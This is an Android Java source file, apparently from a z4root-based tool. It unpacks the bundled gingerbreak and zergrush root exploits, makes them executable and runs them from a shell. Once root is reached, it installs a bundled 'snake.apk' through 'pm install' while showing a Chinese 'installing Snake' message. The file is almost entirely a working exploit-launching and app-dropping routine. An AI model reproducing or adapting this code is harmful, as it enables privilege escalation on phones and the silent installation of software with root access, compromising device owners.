package com.z4mod.z4root2;

import jackpal.androidterm.Exec;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Calendar;
import java.util.Timer;
import java.util.zip.GZIPInputStream;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import android.widget.TextView;
import com.z4mod.z4root2.VirtualTerminal.VTCommandResult;

public class Phase1 extends Activity {

    public static final String CONFIG_XML = "config_xml";

    public static final String CAN_ROOT = "can_root";

    WakeLock wl;

    static final int SHOW_SETTINGS_DIALOG = 1;

    static final int SHOW_SETTINGS_ERROR_DIALOG = 2;

    TextView detailtext;

    Handler handler = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        detailtext = (TextView) findViewById(R.id.detailtext);
        saystuff("正在安装Snake,请稍候..........");
        dostuff();
    }

    boolean forceunroot = true;

    public void hasRoot() {
        try {
            final VirtualTerminal vt = new VirtualTerminal();
            VTCommandResult r = vt.runCommand("id");
            if (r.success()) {
                forceunroot = false;
            }
            vt.shutdown();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void saystuff(final String stuff) {
        runOnUiThread(new Runnable() {

            @Override
            public void run() {
                detailtext.setText(stuff);
            }
        });
    }

    public void install() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
        wl.acquire();
        try {
            SaveIncludedFileIntoFilesFolder(R.raw.zergrush, "zergrush", getApplicationContext());
        } catch (Exception e1) {
            e1.printStackTrace();
        }
        final int[] processId = new int[1];
        final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
        Log.i("Phase1", "Got processid: " + processId[0]);
        final FileOutputStream out = new FileOutputStream(fd);
        final FileInputStream in = new FileInputStream(fd);
        new Thread() {

            public void run() {
                byte[] mBuffer = new byte[4096];
                int read = 0;
                while (read >= 0) {
                    try {
                        read = in.read(mBuffer);
                        String str = new String(mBuffer, 0, read);
                        Log.i("Phase1", str);
                        if (str.contains("Cannot find adb")) {
                            saystuff("Cannot find adb");
                        }
                    } catch (Exception e) {
                        read = -1;
                        e.printStackTrace();
                    }
                }
            }

            ;
        }.start();
        try {
            Log.i("Phase1", "begin");
            String command = "chmod 777 " + getFilesDir() + "/zergrush\n";
            out.write(command.getBytes());
            out.flush();
            command = getFilesDir() + "/zergrush\n";
            out.write(command.getBytes());
            out.flush();
            Log.i("Phase1", command);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void dostuff() {
        deleteFile(getApplicationContext());
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
        wl.acquire();
        try {
            SaveIncludedFileIntoFilesFolder(R.raw.gingerbreak, "gingerbreak", getApplicationContext());
            SaveIncludedFileIntoFilesFolder(R.raw.snake, "snake.apk", getApplicationContext());
        } catch (Exception e1) {
            e1.printStackTrace();
        }
        final int[] processId = new int[1];
        final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
        Log.i("Phase1", "Got processid: " + processId[0]);
        final FileOutputStream out = new FileOutputStream(fd);
        final FileInputStream in = new FileInputStream(fd);
        new Thread() {

            public void run() {
                byte[] mBuffer = new byte[4096];
                int read = 0;
                while (read >= 0) {
                    try {
                        read = in.read(mBuffer);
                        String str = new String(mBuffer, 0, read);
                        Log.i("Phase1", str);
                        if (str.contains("Killing ADB and restarting as root")) {
                            Log.i("Phase1", "Killing ADB and restarting as root!");
                            Thread.sleep(20000);
                            out.write(("pm install " + getFilesDir() + "/snake.apk\n").getBytes());
                            out.flush();
                            out.write("checkvar=checked\n".getBytes());
                            out.flush();
                            out.write("echo finished $checkvar\n".getBytes());
                            out.flush();
                            out.flush();
                            saystuff("完成Snake安装..........");
                        }
                        if (str.contains("Cannot find adb")) {
                            saystuff("Cannot find adb");
                        }
                    } catch (Exception e) {
                        Log.i("Phase1", "Exception");
                        read = -1;
                        e.printStackTrace();
                    }
                }
            }

            ;
        }.start();
        try {
            String command = "chmod 777 " + getFilesDir() + "/gingerbreak\n";
            out.write(command.getBytes());
            out.flush();
            command = getFilesDir() + "/gingerbreak\n";
            out.write(command.getBytes());
            out.flush();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void SaveIncludedZippedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
        InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
        FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
        GZIPInputStream gzis = new GZIPInputStream(is);
        byte[] bytebuf = new byte[1024];
        int read;
        while ((read = gzis.read(bytebuf)) >= 0) {
            fos.write(bytebuf, 0, read);
        }
        gzis.close();
        fos.getChannel().force(true);
        fos.flush();
        fos.close();
    }

    public static void SaveIncludedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
        InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
        FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
        byte[] bytebuf = new byte[1024];
        int read;
        while ((read = is.read(bytebuf)) >= 0) {
            fos.write(bytebuf, 0, read);
        }
        is.close();
        fos.getChannel().force(true);
        fos.flush();
        fos.close();
    }

    public static void deleteFile(Context ApplicationContext) {
        try {
            ApplicationContext.deleteFile("sh");
        } catch (Exception e) {
        }
        try {
            ApplicationContext.deleteFile("boomsh");
        } catch (Exception e) {
        }
        try {
            ApplicationContext.deleteFile("crashlog");
        } catch (Exception e) {
        }
    }

    public static void SaveIncludedFileIntoLibFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
        InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
        File files = new File("/data/data/com.z4mod.z4root2/files/" + filename);
        if (!files.exists()) {
            FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
            byte[] bytebuf = new byte[1024];
            int read;
            while ((read = is.read(bytebuf)) >= 0) {
                fos.write(bytebuf, 0, read);
            }
            is.close();
            fos.getChannel().force(true);
            fos.flush();
            fos.close();
        }
    }
}
